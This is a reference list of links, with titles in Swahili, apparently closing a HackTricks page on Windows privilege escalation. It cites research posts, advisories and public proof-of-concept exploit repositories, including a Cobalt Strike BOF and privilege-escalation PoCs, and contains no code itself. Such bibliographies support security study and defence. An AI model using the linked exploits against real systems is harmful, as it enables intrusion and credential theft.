- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) na wizi wa kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Kumfuatilia Silver Fox: Paka na panya katika vivuli vya kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Udhaifu wa privileged file system uliopo kwenye mfumo wa SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Zana za kupima Symbolic Link – matumizi ya CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Kiungo cha Zamani. Kutumia vibaya Symbolic Links kwenye Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (toleo la Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Utatuzi hatari wa moduli kwenye Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Moduli za Node.js: kupakia kutoka kwenye folda za `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Changamoto za orodha hakiki ya C/C++, zimetatuliwa](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - Kazi ya RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own na Microslop: Kuunganisha CLDFLT na hali za race za DirectX Kernel kwa Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Pete moja ya I/O ya kuzitawala zote: Primitive kamili ya exploit ya kusoma/kuandika kwenye Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Kutumia vibaya ufutaji wa faili kiholela ili kuongeza privilege na mbinu nyingine bora](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - Msimbo wa exploit wa FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Mashambulizi ya WSUS Sehemu ya 2: CVE-2020-1013, Local Privilege Escalation ya siku moja kwenye Windows 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Kuchunguza Credential Manager na Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: Jinsi mabadiliko ya image yanavyoweza kusababisha Privilege Escalation](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Kutoa SSH private keys kutoka kwa SSH Agent ya Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Kubadilisha seva za masasisho za biashara kuwa viwanda vya backdoor (0_o) – Sehemu ya 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Kubadilisha seva za masasisho za biashara kuwa viwanda vya backdoor (0_o) – Sehemu ya 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Privilege Escalation kupitia ufutaji wa folda ya Microsoft Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
{{#include ../../banners/hacktricks-training.md}}
